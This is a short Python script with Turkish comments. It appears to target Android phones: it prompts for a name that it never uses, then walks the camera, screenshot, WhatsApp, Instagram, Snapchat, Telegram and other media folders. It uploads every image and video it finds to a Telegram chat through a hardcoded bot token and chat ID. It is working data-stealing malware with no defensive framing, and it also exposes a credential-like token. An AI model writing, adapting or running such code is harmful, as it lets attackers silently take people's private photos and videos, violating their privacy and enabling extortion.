import os
import requests

BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
USER_ID = "6044093818"  # Buraya kullanıcı ID'sini yazmalısınız.

# Kullanıcıdan isim alma
name = input("Lütfen bir isim girin: ")

# Dizinlerin listesi
directories = [
    "/storage/emulated/0/DCIM/Camera/",
    "/storage/emulated/0/Pictures/Screenshots/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Video/",
    "/storage/emulated/0/Pictures/Instagram/",
    "/storage/emulated/0/Movies/Instagram/",
    "/storage/emulated/0/Pictures/Facebook/",
    "/storage/emulated/0/Movies/CapCut/",
    "/storage/emulated/0/Pictures/CapCut/",
    "/storage/emulated/0/Pictures/Snapchat/",
    "/storage/emulated/0/Pictures/PicsArt/",
    "/storage/emulated/0/Movies/Snapchat/", 
    "/storage/emulated/0/Pictures/Twitter/",
    "/storage/emulated/0/Movies/Twitter/",
    "/storage/emulated/0/Download/Telegram/",
    "/storage/emulated/0/Movies/",
    "/storage/emulated/0/Videos/"
]

image_extensions = [".jpg", ".jpeg", ".png", ".gif"]
video_extensions = [".mp4", ".mov", ".avi"]

def send_media_to_user(file_path):
    # Dosya türüne göre uygun URL belirle
    if file_path.endswith(tuple(image_extensions)):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        media_type = "photo"
    elif file_path.endswith(tuple(video_extensions)):
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        media_type = "video"
    else:
        print(f"Desteklenmeyen dosya türü: {file_path}")
        return  # Desteklenmeyen dosya türü

    with open(file_path, "rb") as media_file:
        data = {"chat_id": USER_ID}
        files = {media_type: media_file}

        response = requests.post(url, data=data, files=files)
        
        if response.status_code == 200:
            print(f"Telegram'a gönderildi: {file_path}")
        else:
            print(f"Telegram'a gönderilirken hata oluştu: {response.text}")

def check_and_send_files():
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path.endswith(tuple(image_extensions + video_extensions)):
                        send_media_to_user(file_path)
        else:
            print(f"Dizin mevcut değil: {directory}")

check_and_send_files()
